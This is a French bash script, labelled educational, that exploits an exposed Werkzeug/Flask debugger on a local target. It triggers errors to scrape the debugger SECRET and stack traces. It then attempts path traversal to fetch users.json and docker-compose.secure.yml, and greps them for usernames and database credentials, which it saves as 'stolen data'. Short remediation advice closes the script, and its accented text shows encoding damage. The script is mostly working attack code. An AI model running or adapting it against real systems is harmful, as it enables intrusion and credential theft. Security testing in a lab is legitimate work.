#!/bin/bash
# Exploitation de la faille Werkzeug Debugger
# ATTENTION : Script Ã©ducatif uniquement !

TARGET="http://localhost:8050"
OUTPUT_DIR="./stolen_data"

echo "ðŸŽ­ EXPLOITATION WERKZEUG DEBUGGER"
echo "=================================="
echo "Target: $TARGET"
echo ""

mkdir -p "$OUTPUT_DIR"

# Ã‰tape 1 : DÃ©clencher une erreur pour exposer le debugger
echo "[1/5] ðŸ” DÃ©clenchement d'une erreur pour exposer le debugger..."
response=$(curl -s "$TARGET/invalid_route_to_trigger_error" 2>&1)

# Extraire le SECRET
SECRET=$(echo "$response" | grep -oP 'SECRET = "\K[^"]+' | head -1)

if [ -n "$SECRET" ]; then
    echo "âœ… SECRET trouvÃ© : $SECRET"
    echo "$SECRET" > "$OUTPUT_DIR/werkzeug_secret.txt"
else
    echo "âŒ SECRET non trouvÃ©. Tentative avec POST..."
    response=$(curl -s -X POST "$TARGET/login" -H "Content-Type: application/json" -d '{}' 2>&1)
    SECRET=$(echo "$response" | grep -oP 'SECRET = "\K[^"]+' | head -1)
    
    if [ -n "$SECRET" ]; then
        echo "âœ… SECRET trouvÃ© via POST : $SECRET"
        echo "$SECRET" > "$OUTPUT_DIR/werkzeug_secret.txt"
    else
        echo "âŒ Impossible de rÃ©cupÃ©rer le SECRET"
        exit 1
    fi
fi

# Ã‰tape 2 : Extraction des variables d'environnement
echo ""
echo "[2/5] ðŸ” Extraction des variables d'environnement..."
curl -s "$TARGET/invalid_route" 2>&1 | head -100 > "$OUTPUT_DIR/error_details.html"
echo "âœ… DÃ©tails d'erreur sauvegardÃ©s dans $OUTPUT_DIR/error_details.html"

# Ã‰tape 3 : Tentative de lecture de fichiers sensibles via stack trace
echo ""
echo "[3/5] ðŸ“ Analyse des chemins de fichiers exposÃ©s..."
paths=$(echo "$response" | grep -oP '/app/[^"]+' | sort -u)
echo "Chemins dÃ©couverts :"
echo "$paths"
echo "$paths" > "$OUTPUT_DIR/exposed_paths.txt"

# Ã‰tape 4 : Extraction d'informations via diffÃ©rentes mÃ©thodes HTTP
echo ""
echo "[4/5] ðŸŽ¯ Test de diffÃ©rentes routes pour exfiltration..."

# Tentative d'accÃ¨s au fichier users.json
curl -s "$TARGET/../dashboard/users.json" -o "$OUTPUT_DIR/users.json" 2>/dev/null
if [ -f "$OUTPUT_DIR/users.json" ]; then
    size=$(wc -c < "$OUTPUT_DIR/users.json")
    if [ $size -gt 10 ]; then
        echo "âœ… users.json rÃ©cupÃ©rÃ© ($size bytes)"
    fi
fi

# Tentative d'accÃ¨s Ã  docker-compose
curl -s "$TARGET/../docker-compose.secure.yml" -o "$OUTPUT_DIR/docker-compose.yml" 2>/dev/null
if [ -f "$OUTPUT_DIR/docker-compose.yml" ]; then
    size=$(wc -c < "$OUTPUT_DIR/docker-compose.yml")
    if [ $size -gt 10 ]; then
        echo "âœ… docker-compose.yml rÃ©cupÃ©rÃ© ($size bytes)"
    fi
fi

# Ã‰tape 5 : Analyse des informations sensibles trouvÃ©es
echo ""
echo "[5/5] ðŸ“Š Analyse des donnÃ©es exfiltrÃ©es..."
echo ""
echo "=================================="
echo "ðŸ“‹ RÃ‰SUMÃ‰ DE L'EXPLOITATION"
echo "=================================="

if [ -f "$OUTPUT_DIR/werkzeug_secret.txt" ]; then
    echo "ðŸ”´ CRITIQUE : Werkzeug SECRET exposÃ©"
fi

if [ -f "$OUTPUT_DIR/error_details.html" ]; then
    # Recherche de credentials dans les stack traces
    if grep -qi "password\|secret\|key\|token" "$OUTPUT_DIR/error_details.html"; then
        echo "ðŸ”´ CRITIQUE : Credentials potentiels dans les stack traces"
    fi
fi

if [ -f "$OUTPUT_DIR/users.json" ] && [ $(wc -c < "$OUTPUT_DIR/users.json") -gt 10 ]; then
    echo "ðŸ”´ CRITIQUE : Fichier users.json accessible"
    echo "   Utilisateurs compromis :"
    cat "$OUTPUT_DIR/users.json" | grep -oP '"username":\s*"\K[^"]+' | head -5
fi

if [ -f "$OUTPUT_DIR/docker-compose.yml" ] && [ $(wc -c < "$OUTPUT_DIR/docker-compose.yml") -gt 10 ]; then
    echo "ðŸ”´ CRITIQUE : docker-compose.yml accessible"
    echo "   Credentials DB exposÃ©s :"
    grep -E "user|password|POSTGRES" "$OUTPUT_DIR/docker-compose.yml" | head -5
fi

echo ""
echo "ðŸ“ DonnÃ©es exfiltrÃ©es sauvegardÃ©es dans : $OUTPUT_DIR/"
echo ""
echo "=================================="
echo "ðŸ’¡ RECOMMANDATIONS"
echo "=================================="
echo "1. DÃ‰SACTIVER le mode DEBUG en production"
echo "2. DÃ©finir FLASK_ENV=production"
echo "3. Ne JAMAIS exposer les stack traces"
echo "4. ImplÃ©menter des pages d'erreur custom"
echo "5. VÃ©rifier les permissions d'accÃ¨s aux fichiers"
echo ""
